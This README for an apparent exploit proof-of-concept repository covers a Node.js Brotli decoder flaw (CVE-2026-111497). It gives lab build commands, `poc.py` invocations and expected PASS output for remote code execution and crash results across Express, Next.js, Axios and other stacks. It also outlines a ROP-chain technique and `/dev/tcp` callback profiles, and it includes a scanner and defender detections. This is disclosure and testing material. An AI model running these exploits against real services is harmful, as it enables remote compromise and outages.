# CVE-2026-111497 — Node.js Brotli decoder PoC

> **Disclaimer**
>
> Use this repository only with the included loopback labs or systems you are
> explicitly authorized to test. See [AUTHORIZED_USE.md](AUTHORIZED_USE.md).

The malformed Brotli stream in this repository exercises an out-of-bounds
write in affected Node.js decoders. The highest reproduced impact is **RCE**
in three exact Linux x86-64 lab profiles. The Express 5.3.0 profile is a
network-only exploit: `poc.py` sends HTTP requests to an already-running lab
and receives fresh `/usr/bin/id` output on the exploited request socket. It
does not use a debugger, `/proc`, Docker, a target-side helper, a callback, or
a proof file.

This Express result is profile specific and probabilistic. It depends on the
pinned Node.js v24.22.0 binary, body-parser 2.4.0, one libuv worker, accepted
socket fd 19, the documented restart supervisor, and an ASLR address guess.
It does not imply that every Express deployment is exploitable.

[Node.js advisory](https://nodejs.org/en/blog/vulnerability/october-2026-security-releases)
became public on 21 October 2026. The linked results were recorded against
the included local labs on 22–23 October 2026.

The Express profile passed on two fresh affected containers. The same request
failed closed on Node.js v24.22.1 with `ERR__ERROR_FORMAT_BLOCK_SWITCH`, and
the patched service remained healthy. [Full evidence](docs/evidence/express-x86_64-blackbox-rce.txt).

### Verified PoC

![Live network-only Express RCE run with fresh id output](docs/demo/node-24.22.0-express-5.3.0-bookworm-x86_64.gif)

The recording types and runs the public `poc.py` against an already-running
loopback lab. [VHS tape](docs/demo/node-24.22.0-express-5.3.0-bookworm-x86_64.tape) ·
[MP4](docs/demo/node-24.22.0-express-5.3.0-bookworm-x86_64.mp4) ·
[Raw terminal output](docs/demo/node-24.22.0-express-5.3.0-bookworm-x86_64.ascii)

### Safe Multi-Asset Scan

![Live passive scan of every included lab](docs/demo/scan-all-labs.gif)

The scanner correlates bounded HEAD/GET results, runtime/framework identity,
visible URL-input surfaces, response encoding, and zero-byte TCP reachability.
It does not invoke the PoC, send malformed Brotli, crash a worker, or execute
commands.

### Defender detection

The [experimental defender package and lab controls](defense/) include a
Suricata indicator for reflected Unix `id` output and a fixed-decoder semantic
control for the invalid Brotli block switch. The latter classifies copied
input; it has no affected-process telemetry or production coverage claim.

## Quick Start

Build and start the exact Express lab. The `--entrypoint` command is part of
the tested profile: it keeps the container alive while the PoC uses the
network crash primitive to request a fresh ASLR layout after a missed guess.

```bash
docker build --pull --platform linux/amd64 -t cve-2026-111497-lab:v24.22.0-express -f lab/v24.22.0/express-body-parser/Dockerfile lab/v24.22.0/express-body-parser
docker run --platform linux/amd64 -d --name cve-111497-express --entrypoint sh -e UV_THREADPOOL_SIZE=1 -p 127.0.0.1:3000:3000 cve-2026-111497-lab:v24.22.0-express -lc "while true; do node /app/server.js; sleep 0.1; done"
python poc.py --profile node-24.22.0-express-5.3.0-bookworm-x86_64 --timeout 30
```

A successful run ends with output shaped like:

```text
PASS: RCE verified by fresh id output through the declared interface
profile=node-24.22.0-express-5.3.0-bookworm-x86_64
proof_channel=HTTP request socket stdout
proof_command=id
proof_stdout=uid=1000(node) gid=1000(node) groups=1000(node)
```

The PoC tries at most 16 fresh supervised processes and exits nonzero unless
complete `uid=` and `gid=` output is observed. Stop the lab when finished:

```bash
docker rm -f cve-111497-express
```

## Safe Multi-Asset Scanner

Start the included labs on the loopback ports in `assets.txt`, then run:

```bash
docker compose -f compose.scan.yaml up -d --build
python scan.py --assets assets.txt
docker compose -f compose.scan.yaml down -v
```

`STATUS` reports affected/patched only when a target naturally discloses an
exact Node.js version. `EXPOSURE` and `SIGNALS` separately report framework,
transport, Brotli-response, and visible URL-input evidence; they never upgrade
an asset to vulnerable. Use `--format jsonl` for complete signals. [VHS tape](docs/demo/scan-all-labs.tape) ·
[MP4](docs/demo/scan-all-labs.mp4) ·
[Raw terminal output](docs/demo/scan-all-labs.ascii) ·
[Validation record](docs/evidence/scan-all-labs-validation.txt)

## Labs

Each lab subsection includes a live VHS v0.12.1 recording of its documented
`poc.py` command against an already-running container, plus the tape, MP4, and
raw terminal output from that take. Container setup is performed separately.

| Runtime | Lab | Status | Proof | Material limitations |
| --- | --- | --- | --- | --- |
| Node.js v24.22.0 | [Express 5.3.0 / body-parser 2.4.0](lab/v24.22.0/express-body-parser/) | [**RCE verified**](docs/evidence/express-x86_64-blackbox-rce.txt) | Fresh `id` stdout on the HTTP socket, twice | Exact binary, fd 19, one worker, restart supervisor, and probabilistic ASLR guess |
| Node.js v24.9.0 | [Built-in `fetch()` worker](lab/v24.9.0/worker-fetch/) | [**RCE verified**](docs/evidence/rce-http-fetch-v24.9.0.txt) | Fresh token plus `id` stdout, twice | Exact binary, glibc, worker, record, ICU, and allocator sequence; probabilistic placement |
| Node.js v24.9.0 | [Direct worker record transform](lab/v24.9.0/worker-record-transform/) | [**RCE verified**](docs/evidence/rce-black-box-v24.9.0.txt) | Fresh token plus `id` stdout, twice | Exact binary, glibc, libuv worker, record, ICU, and allocator sequence |
| Node.js v24.9.0 | [Express 5.3.0 + built-in `fetch()`](lab/v24.9.0/express-fetch/) | [**DoS verified**](docs/evidence/express-fetch-v24.9.0.txt) | Two service crashes; process exit 139 | Plain Express URL-fetch route; no RCE observed |
| Node.js v20.19.5 | [Stock asynchronous zlib](lab/v20.19.5/stock-node/) | [**DoS verified**](docs/evidence/version-matrix.txt) | Service unavailable, twice | EOL release |
| Node.js v22.23.3 | [Stock asynchronous zlib](lab/v22.23.3/stock-node/) | [**DoS verified**](docs/evidence/version-matrix.txt) | Service unavailable, twice | Availability impact only |
| Node.js v24.9.0 | [Stock asynchronous zlib](lab/v24.9.0/stock-node/) | [**DoS verified**](docs/evidence/version-matrix.txt) | Service unavailable, twice | Availability impact only |
| Node.js v24.22.0 | [Stock asynchronous zlib](lab/v24.22.0/stock-node/) | [**DoS verified**](docs/evidence/version-matrix.txt) | Service unavailable, twice | Availability impact only |
| Node.js v26.12.0 | [Stock asynchronous zlib](lab/v26.12.0/stock-node/) | [**DoS verified**](docs/evidence/version-matrix.txt) | Service unavailable, twice | Availability impact only |
| Node.js v24.22.0 | [Built-in fetch proxy](lab/v24.22.0/node-fetch-proxy/) | [**DoS verified**](docs/evidence/application-matrix.txt) | Service unavailable, twice | Consumes an attacker-controlled Brotli response |
| Node.js v24.22.0 | [Undici 8.12.3](lab/v24.22.0/undici-fetch/) | [**DoS verified**](docs/evidence/popular-library-matrix.txt) | Service unavailable, twice | Standalone Undici response consumption |
| Node.js v24.22.0 | [Axios 1.20.0](lab/v24.22.0/axios-fetch/) | [**DoS verified**](docs/evidence/popular-library-matrix.txt) | Service unavailable, twice | Automatic response decompression |
| Node.js v24.22.0 | [node-fetch 3.3.2](lab/v24.22.0/node-fetch/) | [**DoS verified**](docs/evidence/popular-library-matrix.txt) | Service unavailable, twice | Encoded response body must be consumed |
| Node.js v24.22.0 | [Got 16.1.0](lab/v24.22.0/got-fetch/) | [**DoS verified**](docs/evidence/popular-library-matrix.txt) | Service unavailable, twice | Uses `decompress-response` |
| Node.js v24.22.0 | [SuperAgent 10.4.1](lab/v24.22.0/superagent-fetch/) | [**DoS verified**](docs/evidence/popular-library-matrix.txt) | Service unavailable, twice | Automatic response decompression |
| Node.js v24.22.0 | [`decompress-response` 10.0.0](lab/v24.22.0/decompress-response/) | [**DoS verified**](docs/evidence/popular-library-matrix.txt) | Service unavailable, twice | Wrapped response stream reaches Brotli |
| Node.js v24.22.0 | [NestJS 12.2.0](lab/v24.22.0/nestjs-body-parser/) | [**DoS verified**](docs/evidence/popular-library-matrix.txt) | Service unavailable, twice | Default Express adapter and body-parser |
| Node.js v24.22.0 | [Koa 3.2.1 / koa-bodyparser 4.4.1](lab/v24.22.0/koa-bodyparser/) | [**DoS verified**](docs/evidence/popular-library-matrix.txt) | Service unavailable, twice | `co-body`/`inflation` request path |
| Node.js v24.22.0 | [Next.js 16.4.2 fetch route](lab/v24.22.0/nextjs-fetch/) | [**DoS verified**](docs/evidence/application-matrix.txt) | Service unavailable, twice | Server route fetches and consumes attacker content |

### Node.js v24.9.0 Express + built-in `fetch()`

This minimal URL-fetch route uses ordinary Express request handling and
`fetch()` response consumption. The public PoC supplies an attacker-controlled
Brotli response over HTTP. Development runs observed a service crash, not
command execution; two fresh exact-profile instances reproduced the crash.

```bash
docker build --pull --platform linux/amd64 -t cve-2026-111497-lab:v24.9.0-express-fetch -f lab/v24.9.0/express-fetch/Dockerfile lab/v24.9.0/express-fetch
docker run --platform linux/amd64 -d --name cve-111497-express-fetch --add-host host.docker.internal:host-gateway -p 127.0.0.1:3000:3000 cve-2026-111497-lab:v24.9.0-express-fetch
python poc.py --profile node-24.9.0-express-fetch-5.3.0-bookworm-x86_64
docker rm -f cve-111497-express-fetch
```

Expected: `PASS: DoS verified through the declared network interface` and
`postcondition=service unavailable`. The operator-side process exit is 139.
The PoC only talks to the published HTTP route and its own HTTP origin; it
does not call Docker or access the container filesystem.

![Live PoC run for the vulnerable Express fetch lab](docs/demo/node-24.9.0-express-fetch-5.3.0-bookworm-x86_64.gif)

[VHS tape](docs/demo/node-24.9.0-express-fetch-5.3.0-bookworm-x86_64.tape) · [MP4](docs/demo/node-24.9.0-express-fetch-5.3.0-bookworm-x86_64.mp4) · [Raw terminal output](docs/demo/node-24.9.0-express-fetch-5.3.0-bookworm-x86_64.ascii)

### Node.js v24.9.0 built-in `fetch()` worker

RCE verified: this exact worker-per-request fixture produced fresh `id` stdout
in two clean instances. Allocator placement remains probabilistic.

```bash
docker build --pull --platform linux/amd64 -t cve-2026-111497-lab:v24.9.0-worker-fetch-rce -f lab/v24.9.0/worker-fetch/Dockerfile lab/v24.9.0/worker-fetch
docker run --platform linux/amd64 -d --name cve-111497-worker-fetch-rce --add-host host.docker.internal:host-gateway -p 127.0.0.1:3000:3000 cve-2026-111497-lab:v24.9.0-worker-fetch-rce
python poc.py --profile node-24.9.0-worker-fetch-rce-bookworm-x86_64 --timeout 60 --callback-bind 0.0.0.0 --callback-host host.docker.internal
docker rm -f cve-111497-worker-fetch-rce
```

Expected: fresh token plus `proof_command=id` and `proof_stdout` containing
both `uid=` and `gid=`.

![Live PoC run for node-24.9.0-worker-fetch-rce-bookworm-x86_64](docs/demo/worker-fetch-rce.gif)

[VHS tape](docs/demo/worker-fetch-rce.tape) · [MP4](docs/demo/worker-fetch-rce.mp4) · [Raw terminal output](docs/demo/worker-fetch-rce.ascii)

### Node.js v24.9.0 direct worker record transform

RCE verified: this exact asynchronous `node:zlib` fixture produced fresh `id`
stdout twice.

```bash
docker build --pull --platform linux/amd64 -t cve-2026-111497-lab:v24.9.0-worker-record-rce -f lab/v24.9.0/worker-record-transform/Dockerfile lab/v24.9.0/worker-record-transform
docker run --platform linux/amd64 -d --name cve-111497-worker-record-rce --add-host host.docker.internal:host-gateway -p 127.0.0.1:3000:3000 cve-2026-111497-lab:v24.9.0-worker-record-rce
python poc.py --profile node-24.9.0-worker-record-rce-bookworm-x86_64 --timeout 30 --callback-bind 0.0.0.0 --callback-host host.docker.internal
docker rm -f cve-111497-worker-record-rce
```

Expected: fresh token plus `proof_command=id` and `proof_stdout` containing
both `uid=` and `gid=`.

![Live PoC run for node-24.9.0-worker-record-rce-bookworm-x86_64](docs/demo/node-24.9.0-worker-record-rce-bookworm-x86_64.gif)

[VHS tape](docs/demo/node-24.9.0-worker-record-rce-bookworm-x86_64.tape) · [MP4](docs/demo/node-24.9.0-worker-record-rce-bookworm-x86_64.mp4) · [Raw terminal output](docs/demo/node-24.9.0-worker-record-rce-bookworm-x86_64.ascii)

### Node.js v20.19.5 stock asynchronous zlib

DoS verified: the pinned EOL runtime runs the asynchronous `node:zlib` fixture.

```bash
docker build --pull --platform linux/amd64 -t cve-2026-111497-lab:v20.19.5 -f lab/v20.19.5/stock-node/Dockerfile lab/v20.19.5/stock-node
docker run --platform linux/amd64 -d --name cve-111497-v20-stock -p 127.0.0.1:3000:3000 cve-2026-111497-lab:v20.19.5
python poc.py --profile node-20.19.5-bookworm-x86_64
docker rm -f cve-111497-v20-stock
```

Expected: `PASS: DoS verified through the declared network interface`.

![Live PoC run for node-20.19.5-bookworm-x86_64](docs/demo/node-20.19.5-bookworm-x86_64.gif)

[VHS tape](docs/demo/node-20.19.5-bookworm-x86_64.tape) · [MP4](docs/demo/node-20.19.5-bookworm-x86_64.mp4) · [Raw terminal output](docs/demo/node-20.19.5-bookworm-x86_64.ascii)

### Node.js v22.23.3 stock asynchronous zlib

DoS verified: the pinned affected v22 runtime runs the asynchronous zlib fixture.

```bash
docker build --pull --platform linux/amd64 -t cve-2026-111497-lab:v22.23.3 -f lab/v22.23.3/stock-node/Dockerfile lab/v22.23.3/stock-node
docker run --platform linux/amd64 -d --name cve-111497-v22-stock -p 127.0.0.1:3000:3000 cve-2026-111497-lab:v22.23.3
python poc.py --profile node-22.23.3-bookworm-x86_64
docker rm -f cve-111497-v22-stock
```

Expected: `PASS: DoS verified through the declared network interface`.

![Live PoC run for node-22.23.3-bookworm-x86_64](docs/demo/node-22.23.3-bookworm-x86_64.gif)

[VHS tape](docs/demo/node-22.23.3-bookworm-x86_64.tape) · [MP4](docs/demo/node-22.23.3-bookworm-x86_64.mp4) · [Raw terminal output](docs/demo/node-22.23.3-bookworm-x86_64.ascii)

### Node.js v24.9.0 stock asynchronous zlib

DoS verified: the pinned v24.9.0 runtime runs the stock zlib fixture.

```bash
docker build --pull --platform linux/amd64 -t cve-2026-111497-lab:v24.9.0 -f lab/v24.9.0/stock-node/Dockerfile lab/v24.9.0/stock-node
docker run --platform linux/amd64 -d --name cve-111497-v24-9-stock -p 127.0.0.1:3000:3000 cve-2026-111497-lab:v24.9.0
python poc.py --profile node-24.9.0-bookworm-x86_64
docker rm -f cve-111497-v24-9-stock
```

Expected: `PASS: DoS verified through the declared network interface`.

![Live PoC run for node-24.9.0-bookworm-x86_64](docs/demo/node-24.9.0-bookworm-x86_64.gif)

[VHS tape](docs/demo/node-24.9.0-bookworm-x86_64.tape) · [MP4](docs/demo/node-24.9.0-bookworm-x86_64.mp4) · [Raw terminal output](docs/demo/node-24.9.0-bookworm-x86_64.ascii)

### Node.js v24.22.0 stock asynchronous zlib

DoS verified: the last affected v24 build runs the stock zlib fixture.

```bash
docker build --pull --platform linux/amd64 -t cve-2026-111497-lab:v24.22.0 -f lab/v24.22.0/stock-node/Dockerfile lab/v24.22.0/stock-node
docker run --platform linux/amd64 -d --name cve-111497-v24-stock -p 127.0.0.1:3000:3000 cve-2026-111497-lab:v24.22.0
python poc.py --profile node-24.22.0-bookworm-x86_64
docker rm -f cve-111497-v24-stock
```

Expected: `PASS: DoS verified through the declared network interface`.

![Live PoC run for node-24.22.0-bookworm-x86_64](docs/demo/node-24.22.0-bookworm-x86_64.gif)

[VHS tape](docs/demo/node-24.22.0-bookworm-x86_64.tape) · [MP4](docs/demo/node-24.22.0-bookworm-x86_64.mp4) · [Raw terminal output](docs/demo/node-24.22.0-bookworm-x86_64.ascii)

### Node.js v26.12.0 stock asynchronous zlib

DoS verified: the last affected v26 build runs the stock zlib fixture.

```bash
docker build --pull --platform linux/amd64 -t cve-2026-111497-lab:v26.12.0 -f lab/v26.12.0/stock-node/Dockerfile lab/v26.12.0/stock-node
docker run --platform linux/amd64 -d --name cve-111497-v26-stock -p 127.0.0.1:3000:3000 cve-2026-111497-lab:v26.12.0
python poc.py --profile node-26.12.0-bookworm-x86_64
docker rm -f cve-111497-v26-stock
```

Expected: `PASS: DoS verified through the declared network interface`.

![Live PoC run for node-26.12.0-bookworm-x86_64](docs/demo/node-26.12.0-bookworm-x86_64.gif)

[VHS tape](docs/demo/node-26.12.0-bookworm-x86_64.tape) · [MP4](docs/demo/node-26.12.0-bookworm-x86_64.mp4) · [Raw terminal output](docs/demo/node-26.12.0-bookworm-x86_64.ascii)

### Node.js v24.22.0 built-in fetch proxy

DoS verified: the route consumes a Brotli response with Node's built-in client.

```bash
docker build --pull --platform linux/amd64 -t cve-2026-111497-lab:v24.22.0-fetch -f lab/v24.22.0/node-fetch-proxy/Dockerfile lab/v24.22.0/node-fetch-proxy
docker run --platform linux/amd64 -d --name cve-111497-fetch --add-host host.docker.internal:host-gateway -p 127.0.0.1:3000:3000 cve-2026-111497-lab:v24.22.0-fetch
python poc.py --profile node-24.22.0-fetch-bookworm-x86_64
docker rm -f cve-111497-fetch
```

Expected: `PASS: DoS verified through the declared network interface` after
the application consumes the attacker-controlled response.

![Live PoC run for node-24.22.0-fetch-bookworm-x86_64](docs/demo/node-24.22.0-fetch-bookworm-x86_64.gif)

[VHS tape](docs/demo/node-24.22.0-fetch-bookworm-x86_64.tape) · [MP4](docs/demo/node-24.22.0-fetch-bookworm-x86_64.mp4) · [Raw terminal output](docs/demo/node-24.22.0-fetch-bookworm-x86_64.ascii)

### Node.js v24.22.0 with Undici 8.12.3

DoS verified: standalone Undici consumes the encoded response body.

```bash
docker build --pull --platform linux/amd64 -t cve-2026-111497-lab:v24.22.0-undici -f lab/v24.22.0/undici-fetch/Dockerfile lab/v24.22.0/undici-fetch
docker run --platform linux/amd64 -d --name cve-111497-undici --add-host host.docker.internal:host-gateway -p 127.0.0.1:3000:3000 cve-2026-111497-lab:v24.22.0-undici
python poc.py --profile node-24.22.0-undici-8.12.3-bookworm-x86_64
docker rm -f cve-111497-undici
```

Expected: `PASS: DoS verified through the declared network interface`.

![Live PoC run for node-24.22.0-undici-8.12.3-bookworm-x86_64](docs/demo/node-24.22.0-undici-8.12.3-bookworm-x86_64.gif)

[VHS tape](docs/demo/node-24.22.0-undici-8.12.3-bookworm-x86_64.tape) · [MP4](docs/demo/node-24.22.0-undici-8.12.3-bookworm-x86_64.mp4) · [Raw terminal output](docs/demo/node-24.22.0-undici-8.12.3-bookworm-x86_64.ascii)

### Node.js v24.22.0 with Axios 1.20.0

DoS verified: Axios automatically decompresses the crafted Brotli response.

```bash
docker build --pull --platform linux/amd64 -t cve-2026-111497-lab:v24.22.0-axios-fetch -f lab/v24.22.0/axios-fetch/Dockerfile lab/v24.22.0/axios-fetch
docker run --platform linux/amd64 -d --name cve-111497-axios --add-host host.docker.internal:host-gateway -p 127.0.0.1:3000:3000 cve-2026-111497-lab:v24.22.0-axios-fetch
python poc.py --profile node-24.22.0-axios-1.20.0-bookworm-x86_64
docker rm -f cve-111497-axios
```

Expected: `PASS: DoS verified through the declared network interface`.

![Live PoC run for node-24.22.0-axios-1.20.0-bookworm-x86_64](docs/demo/node-24.22.0-axios-1.20.0-bookworm-x86_64.gif)

[VHS tape](docs/demo/node-24.22.0-axios-1.20.0-bookworm-x86_64.tape) · [MP4](docs/demo/node-24.22.0-axios-1.20.0-bookworm-x86_64.mp4) · [Raw terminal output](docs/demo/node-24.22.0-axios-1.20.0-bookworm-x86_64.ascii)

### Node.js v24.22.0 with node-fetch 3.3.2

DoS verified: node-fetch consumes the crafted encoded response body.

```bash
docker build --pull --platform linux/amd64 -t cve-2026-111497-lab:v24.22.0-node-fetch -f lab/v24.22.0/node-fetch/Dockerfile lab/v24.22.0/node-fetch
docker run --platform linux/amd64 -d --name cve-111497-node-fetch --add-host host.docker.internal:host-gateway -p 127.0.0.1:3000:3000 cve-2026-111497-lab:v24.22.0-node-fetch
python poc.py --profile node-24.22.0-node-fetch-3.3.2-bookworm-x86_64
docker rm -f cve-111497-node-fetch
```

Expected: `PASS: DoS verified through the declared network interface`.

![Live PoC run for node-24.22.0-node-fetch-3.3.2-bookworm-x86_64](docs/demo/node-24.22.0-node-fetch-3.3.2-bookworm-x86_64.gif)

[VHS tape](docs/demo/node-24.22.0-node-fetch-3.3.2-bookworm-x86_64.tape) · [MP4](docs/demo/node-24.22.0-node-fetch-3.3.2-bookworm-x86_64.mp4) · [Raw terminal output](docs/demo/node-24.22.0-node-fetch-3.3.2-bookworm-x86_64.ascii)

### Node.js v24.22.0 with Got 16.1.0

DoS verified: Got reaches the Brotli decoder through `decompress-response`.

```bash
docker build --pull --platform linux/amd64 -t cve-2026-111497-lab:v24.22.0-got-fetch -f lab/v24.22.0/got-fetch/Dockerfile lab/v24.22.0/got-fetch
docker run --platform linux/amd64 -d --name cve-111497-got --add-host host.docker.internal:host-gateway -p 127.0.0.1:3000:3000 cve-2026-111497-lab:v24.22.0-got-fetch
python poc.py --profile node-24.22.0-got-16.1.0-bookworm-x86_64
docker rm -f cve-111497-got
```

Expected: `PASS: DoS verified through the declared network interface`.

![Live PoC run for node-24.22.0-got-16.1.0-bookworm-x86_64](docs/demo/node-24.22.0-got-16.1.0-bookworm-x86_64.gif)

[VHS tape](docs/demo/node-24.22.0-got-16.1.0-bookworm-x86_64.tape) · [MP4](docs/demo/node-24.22.0-got-16.1.0-bookworm-x86_64.mp4) · [Raw terminal output](docs/demo/node-24.22.0-got-16.1.0-bookworm-x86_64.ascii)

### Node.js v24.22.0 with SuperAgent 10.4.1

DoS verified: SuperAgent automatically decompresses the crafted response.

```bash
docker build --pull --platform linux/amd64 -t cve-2026-111497-lab:v24.22.0-superagent-fetch -f lab/v24.22.0/superagent-fetch/Dockerfile lab/v24.22.0/superagent-fetch
docker run --platform linux/amd64 -d --name cve-111497-superagent --add-host host.docker.internal:host-gateway -p 127.0.0.1:3000:3000 cve-2026-111497-lab:v24.22.0-superagent-fetch
python poc.py --profile node-24.22.0-superagent-10.4.1-bookworm-x86_64
docker rm -f cve-111497-superagent
```

Expected: `PASS: DoS verified through the declared network interface`.

![Live PoC run for node-24.22.0-superagent-10.4.1-bookworm-x86_64](docs/demo/node-24.22.0-superagent-10.4.1-bookworm-x86_64.gif)

[VHS tape](docs/demo/node-24.22.0-superagent-10.4.1-bookworm-x86_64.tape) · [MP4](docs/demo/node-24.22.0-superagent-10.4.1-bookworm-x86_64.mp4) · [Raw terminal output](docs/demo/node-24.22.0-superagent-10.4.1-bookworm-x86_64.ascii)

### Node.js v24.22.0 with `decompress-response` 10.0.0

DoS verified: the package consumes a Brotli-encoded HTTP response stream.

```bash
docker build --pull --platform linux/amd64 -t cve-2026-111497-lab:v24.22.0-decompress-response -f lab/v24.22.0/decompress-response/Dockerfile lab/v24.22.0/decompress-response
docker run --platform linux/amd64 -d --name cve-111497-decompress-response --add-host host.docker.internal:host-gateway -p 127.0.0.1:3000:3000 cve-2026-111497-lab:v24.22.0-decompress-response
python poc.py --profile node-24.22.0-decompress-response-10.0.0-bookworm-x86_64
docker rm -f cve-111497-decompress-response
```

Expected: `PASS: DoS verified through the declared network interface`.

![Live PoC run for node-24.22.0-decompress-response-10.0.0-bookworm-x86_64](docs/demo/node-24.22.0-decompress-response-10.0.0-bookworm-x86_64.gif)

[VHS tape](docs/demo/node-24.22.0-decompress-response-10.0.0-bookworm-x86_64.tape) · [MP4](docs/demo/node-24.22.0-decompress-response-10.0.0-bookworm-x86_64.mp4) · [Raw terminal output](docs/demo/node-24.22.0-decompress-response-10.0.0-bookworm-x86_64.ascii)

### Node.js v24.22.0 with Express 5.3.0 / body-parser 2.4.0

RCE verified in two fresh containers. The exploit sends a Brotli-encoded JSON
request, redirects the saved return address to an exact-binary ROP chain,
duplicates the accepted HTTP socket onto stdout, and executes `/usr/bin/id`.
After a missed ASLR guess it uses the same vulnerability's network crash
trigger; the documented supervisor then starts a fresh Node process.

```bash
docker build --pull --platform linux/amd64 -t cve-2026-111497-lab:v24.22.0-express -f lab/v24.22.0/express-body-parser/Dockerfile lab/v24.22.0/express-body-parser
docker run --platform linux/amd64 -d --name cve-111497-express --entrypoint sh -e UV_THREADPOOL_SIZE=1 -p 127.0.0.1:3000:3000 cve-2026-111497-lab:v24.22.0-express -lc "while true; do node /app/server.js; sleep 0.1; done"
python poc.py --profile node-24.22.0-express-5.3.0-bookworm-x86_64 --timeout 30
docker rm -f cve-111497-express
```

Expected: `PASS: RCE verified by fresh id output through the declared interface`
and `proof_stdout` containing both `uid=` and `gid=`. A failed run exits
nonzero and does not prove that a different deployment is safe.

![Live network-only RCE run for node-24.22.0-express-5.3.0-bookworm-x86_64](docs/demo/node-24.22.0-express-5.3.0-bookworm-x86_64.gif)

[VHS tape](docs/demo/node-24.22.0-express-5.3.0-bookworm-x86_64.tape) · [MP4](docs/demo/node-24.22.0-express-5.3.0-bookworm-x86_64.mp4) · [Raw terminal output](docs/demo/node-24.22.0-express-5.3.0-bookworm-x86_64.ascii) · [Two fresh runs and patched control](docs/evidence/express-x86_64-blackbox-rce.txt)

### Node.js v24.22.0 with NestJS 12.2.0

DoS verified: the NestJS Express adapter reaches Brotli inflation.

```bash
docker build --pull --platform linux/amd64 -t cve-2026-111497-lab:v24.22.0-nestjs-body-parser -f lab/v24.22.0/nestjs-body-parser/Dockerfile lab/v24.22.0/nestjs-body-parser
docker run --platform linux/amd64 -d --name cve-111497-nestjs -p 127.0.0.1:3000:3000 cve-2026-111497-lab:v24.22.0-nestjs-body-parser
python poc.py --profile node-24.22.0-nestjs-12.2.0-bookworm-x86_64
docker rm -f cve-111497-nestjs
```

Expected: `PASS: DoS verified through the declared network interface`.

![Live PoC run for node-24.22.0-nestjs-12.2.0-bookworm-x86_64](docs/demo/node-24.22.0-nestjs-12.2.0-bookworm-x86_64.gif)

[VHS tape](docs/demo/node-24.22.0-nestjs-12.2.0-bookworm-x86_64.tape) · [MP4](docs/demo/node-24.22.0-nestjs-12.2.0-bookworm-x86_64.mp4) · [Raw terminal output](docs/demo/node-24.22.0-nestjs-12.2.0-bookworm-x86_64.ascii)

### Node.js v24.22.0 with Koa 3.2.1 / koa-bodyparser 4.4.1

DoS verified: koa-bodyparser inflates the crafted Brotli request body.

```bash
docker build --pull --platform linux/amd64 -t cve-2026-111497-lab:v24.22.0-koa-bodyparser -f lab/v24.22.0/koa-bodyparser/Dockerfile lab/v24.22.0/koa-bodyparser
docker run --platform linux/amd64 -d --name cve-111497-koa -p 127.0.0.1:3000:3000 cve-2026-111497-lab:v24.22.0-koa-bodyparser
python poc.py --profile node-24.22.0-koa-3.2.1-koa-bodyparser-4.4.1-bookworm-x86_64
docker rm -f cve-111497-koa
```

Expected: `PASS: DoS verified through the declared network interface`.

![Live PoC run for node-24.22.0-koa-3.2.1-koa-bodyparser-4.4.1-bookworm-x86_64](docs/demo/node-24.22.0-koa-3.2.1-koa-bodyparser-4.4.1-bookworm-x86_64.gif)

[VHS tape](docs/demo/node-24.22.0-koa-3.2.1-koa-bodyparser-4.4.1-bookworm-x86_64.tape) · [MP4](docs/demo/node-24.22.0-koa-3.2.1-koa-bodyparser-4.4.1-bookworm-x86_64.mp4) · [Raw terminal output](docs/demo/node-24.22.0-koa-3.2.1-koa-bodyparser-4.4.1-bookworm-x86_64.ascii)

### Node.js v24.22.0 with Next.js 16.4.2 server fetch

DoS verified: the server route consumes the crafted Brotli response.

```bash
docker build --pull --platform linux/amd64 -t cve-2026-111497-lab:v24.22.0-next -f lab/v24.22.0/nextjs-fetch/Dockerfile lab/v24.22.0/nextjs-fetch
docker run --platform linux/amd64 -d --name cve-111497-next --add-host host.docker.internal:host-gateway -p 127.0.0.1:3000:3000 cve-2026-111497-lab:v24.22.0-next
python poc.py --profile node-24.22.0-next-16.4.2-bookworm-x86_64
docker rm -f cve-111497-next
```

Expected: `PASS: DoS verified through the declared network interface`.

![Live PoC run for node-24.22.0-next-16.4.2-bookworm-x86_64](docs/demo/node-24.22.0-next-16.4.2-bookworm-x86_64.gif)

[VHS tape](docs/demo/node-24.22.0-next-16.4.2-bookworm-x86_64.tape) · [MP4](docs/demo/node-24.22.0-next-16.4.2-bookworm-x86_64.mp4) · [Raw terminal output](docs/demo/node-24.22.0-next-16.4.2-bookworm-x86_64.ascii)

## Requirement of the Exploit

- Python 3.11 or newer; `poc.py` uses only the standard library.
- Docker with Linux x86-64 support for the included pinned labs.
- Free local port `3000` for the Express workflow; the two worker profiles also
  use local ports `4000` and `4444`.
- The exact profile selected from [`profiles.json`](profiles.json); unknown
  profiles, alternate target ports, public targets, and caller-supplied commands
  are rejected.
- Each RCE profile requires its pinned non-PIE Node.js binary, Debian
  bookworm userspace, the Unix `id` utility, and the exact application sequence
  listed in the profile. The two callback profiles additionally require Bash
  `/dev/tcp`.
- RCE PASS requires attacker-visible `id` stdout containing both `uid=` and
  `gid=`. The callback profiles additionally require a fresh random token.

The three RCE results are exact-profile claims, not version-wide claims. The
other affected rows prove repeatable denial of service only. A failed attempt
does not prove safety, and a profile entry is not authorization to test another
system.

## Scanner Limitations

- HTTP applications commonly hide their Node.js version; those results remain
  hidden/unknown rather than being guessed from framework headers or ordinary
  body text that merely mentions a Node.js version.
- Raw TCP labs are checked with a zero-byte connect and close, so reachability
  cannot identify Node.js or determine affected/patched status.
- An observed affected version does not prove the application accepts or
  decompresses attacker-controlled Brotli data.
- An observed patched version covers CVE-2026-111497 only; it is not a general
  security assessment. Redirects are not followed and TLS verification stays
  enabled.
- Missing URL-input or Brotli signals mean only that the requested page did not
  expose them; absence is not proof that a hidden outbound fetch path is absent.

## Reference

- [Node.js October 2026 security advisory](https://nodejs.org/en/blog/vulnerability/october-2026-security-releases)
- [Upstream Brotli decoder patch](https://github.com/google/brotli/commit/0ed4268a4401abcb44720963)
- [Vercel Node.js security advisory](https://vercel.com/kb/bulletin/node-js-security-advisory)
- [Express body-parser request inflation](https://expressjs.com/en/resources/middleware/body-parser.html)
- [Next.js self-hosting](https://nextjs.org/docs/app/guides/self-hosting)
